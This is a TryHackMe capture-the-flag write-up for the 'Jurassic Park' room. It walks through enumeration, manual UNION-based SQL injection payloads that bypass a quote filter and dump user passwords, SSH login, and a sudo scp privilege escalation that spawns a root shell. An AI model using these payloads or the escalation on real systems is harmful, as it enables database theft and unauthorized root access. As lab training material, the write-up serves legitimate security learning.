<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>jurassic park ctf</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>jurassic park ctf</h1><br/><p><strong><h1>THM:Jurassic Park CTF</h1></strong></p><p></p><p><strong>Link to Room:</strong> <a href="https://tryhackme.com/room/jurassicpark">https://tryhackme.com/room/jurassicpark</a></p><p></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p></p><p><strong><h4>Rustscan &amp; Nmap:</h4></strong></p><p><img src="images/47-1.png" alt="images/47-1.png" /></p><p></p><p>There are 2 Open ports. 22(SSH) &amp; 80(Web Server)</p><p></p><p><strong><h4>Website Enumeration:</h4></strong></p><p><img src="images/47-2.png" alt="images/47-2.png" /></p><p></p><p>We click on the “online shop” link to get a page with 3 buying options. I clicked on one of the options and recorded the URL. (Intresting)</p><p><img src="images/47-3.png" alt="images/47-3.png" /></p><p></p><p><strong>URL:</strong> <strong>http://10.10.116.18/item.php?id=1</strong></p><p></p><p>I played around the <strong>id</strong> parameter and could access all 3 options using id=1, id=2, id=3. It seems the site is running a database in the background. Lets enumerate this website with <strong>dirsearch</strong> to find other endpoints.</p><p></p><p><img src="images/47-4.png" alt="images/47-4.png" /></p><p></p><p>The error shows that MySQL Server is running.</p><p></p><p><strong><h4>Dirsearch:</h4></strong></p><p><img src="images/47-5.png" alt="images/47-5.png" /></p><p></p><p><strong><h4>Website Enumeration(Continued):</h4></strong></p><p></p><p>I looked into assests page. It did not have any useful information.</p><p></p><p><strong>/robots.txt</strong></p><p><img src="images/47-6.png" alt="images/47-6.png" /></p><p></p><p></p><p></p><p>We found a random string.</p><p></p><p>/index.php/login → Did not open up any login pages. It was a dead end.</p><p></p><p></p><p>I then tried enumerating using <strong>gobuster</strong> to include a more bigger wordlist.</p><p></p><p><strong><h4>Gobuster:</h4></strong></p><p><img src="images/47-7.png" alt="images/47-7.png" /></p><p></p><p>I found 1 additional directory path.</p><p><strong>/delete</strong></p><p><img src="images/47-8.png" alt="images/47-8.png" /></p><p></p><p>Now we get confirmatio that <strong>MySQL</strong> is running on the system.</p><p></p><p></p><p><strong><h3>Manual SQL Injection:</h3></strong></p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1</strong></p><p><img src="images/47-9.png" alt="images/47-9.png" /></p><p></p><p>The output shows we are on the correct path. We just need to increase the columns till we don&#39;t get the error.</p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2</strong></p><p><img src="images/47-10.png" alt="images/47-10.png" /></p><p></p><p>Finally, we are lucky by selecting 5 rows. We get output.</p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,4,5</strong></p><p><img src="images/47-11.png" alt="images/47-11.png" /></p><p></p><p>I finally got the output by using UNION of 5 colomns. Also we have <strong>4 fields</strong> to <strong>display</strong> our <strong>SQL commands output</strong>.</p><p>I will however use one one field. <strong>Lets take 4</strong></p><p></p><p>So To get the database name. I will use the following URL.</p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,version(),5</strong></p><p><img src="images/47-12.png" alt="images/47-12.png" /></p><p></p><p>We get some System Information Along with Database version: <strong>5.7.25-0ubuntu0.16.04.2</strong></p><p>THM Answer: <strong>ubuntu16.04</strong></p><p></p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,database(),5</strong></p><p><img src="images/47-13.png" alt="images/47-13.png" /></p><p></p><p>We found the answer to the first question of the room.</p><p></p><p><strong>Challenge:</strong></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,table_name,5 FROM information_schema.tables WHERE table_schema=&#39;park</strong>&#39;</p><p></p><p>Upon using the above URL. We got a error that was stopping us from enumerating.</p><p><img src="images/47-14.png" alt="images/47-14.png" /></p><p></p><p></p><p>With a message at the bottom of the page: <strong>Try SqlMap.. I dare you..</strong></p><p>This just means that SQLMAP won&#39;t work. I tried it though and it didn&#39;t work.</p><p></p><p><strong>Research:</strong></p><p>I did a bit hit and try and found that “ ” is working and escaping the filter the website is using. I think Sqlmap did not work because maybe it uses single quotes of enumeration, but the website is blocking it.</p><p></p><p><strong>Solution to Challenge:</strong> Use “park&quot; double quotes</p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(table_name),5 FROM information_schema.tables WHERE table_schema=&quot;park&quot;</strong></p><p><img src="images/47-15.png" alt="images/47-15.png" /></p><p></p><p>We got the table name: <strong>items &amp; users</strong></p><p>Now, Lets check the column names of the each table.</p><p></p><p><strong><h3>Enumerating Users Table:</h3></strong></p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(column_name),5 FROM information_schema.columns WHERE table_name=&quot;users&quot;</strong></p><p><img src="images/47-16.png" alt="images/47-16.png" /></p><p></p><p>It seems the <strong>users</strong> table has <strong>6</strong> columns. </p><p>(But the Tryhackme Room answer is 5 Columns becuase the question refers to the <strong>items</strong> table. Check &quot;<strong>Enumerating Items Table:</strong>&quot; section after this enumeration.)</p><p></p><p>I then moved to list the contents of each column. I found the id &amp; password column did work. But username column was again filtered.</p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(id),5 FROM park.users</strong></p><p><img src="images/47-17.png" alt="images/47-17.png" /></p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(password),5 FROM park.users</strong></p><p><img src="images/47-18.png" alt="images/47-18.png" /></p><p></p><p>Thus, we find 2 passwords. <strong>Note</strong> it for future use.</p><p></p><p></p><p>But we get checked by the filter for the <strong>username</strong> column</p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(username),5 FROM park.users</strong></p><p><img src="images/47-19.png" alt="images/47-19.png" /></p><p></p><p>Moving on.</p><p></p><p><strong><h3>Enumerating Items Table:</h3></strong></p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(column_name),5 FROM information_schema.columns WHERE table_name=&quot;items&quot;</strong></p><p><img src="images/47-20.png" alt="images/47-20.png" /></p><p></p><p>We get <strong>5 Columns</strong>, Thus the answer to Tryhackme room is 5</p><p>Lets enumerate each column.</p><p></p><p><strong>id column</strong></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(id),5 FROM park.items</strong></p><p><img src="images/47-21.png" alt="images/47-21.png" /></p><p></p><p>Seeing the output: There are 5 rows with id - 1,2,3,5,100.</p><p><strong>Note:</strong> Only 1,2,3 were displayed in the webpage.</p><p></p><p>As we had 4 display windows. I am going to use all of them to display the contents of the remaining 4 columns. (package,price,information &amp; sold)</p><p></p><p>URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,GROUP_CONCAT(package),GROUP_CONCAT(price),GROUP_CONCAT(information),GROUP_CONCAT(sold) FROM park.items</strong></p><p></p><p><img src="images/47-22.png" alt="images/47-22.png" /></p><p></p><p>In the Information Field, we got intresting data:</p><p>We get to know a person named: <strong>Dennis</strong></p><p></p><p>Also i see the charecters that are blocked and give the specific permission denied message seen above.</p><p></p><p></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>Since i have 2 Passwords and a Username. I will try SSH login with both the passwords. I successfully logged in using the second one.</p><p></p><p><img src="images/47-23.png" alt="images/47-23.png" /></p><p></p><p><strong>User Enumeration:</strong></p><p></p><p><img src="images/47-24.png" alt="images/47-24.png" /></p><p></p><p>We get the <strong>flag1</strong> in this directory.</p><p><img src="images/47-25.png" alt="images/47-25.png" /></p><p></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>The user dennis is allowed to run <strong>/usr/bin/scp</strong> as <strong>Sudo</strong>. I use the following commands on the machine. Referencing from <strong>GTFOBins</strong>.</p><p>(<strong>https://gtfobins.github.io/gtfobins/scp/#sudo</strong>)</p><p></p><p></p><p><strong>TF=$(mktemp)</strong></p><p><strong>echo &#39;sh 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; $TF</strong></p><p><strong>chmod +x &quot;$TF&quot;</strong></p><p><strong>sudo scp -S $TF x y:</strong></p><p></p><p><img src="images/47-26.png" alt="images/47-26.png" /></p><p></p><p><strong>Flag2.txt(flagTwo.txt)</strong></p><p><img src="images/47-27.png" alt="images/47-27.png" /></p><p></p><p><strong>Flag3</strong></p><p><img src="images/47-28.png" alt="images/47-28.png" /></p><p></p><p><strong>Flag5.txt</strong></p><p><img src="images/47-29.png" alt="images/47-29.png" /></p><p></p><p>Thanks!!</p></div>
</body>
</html>
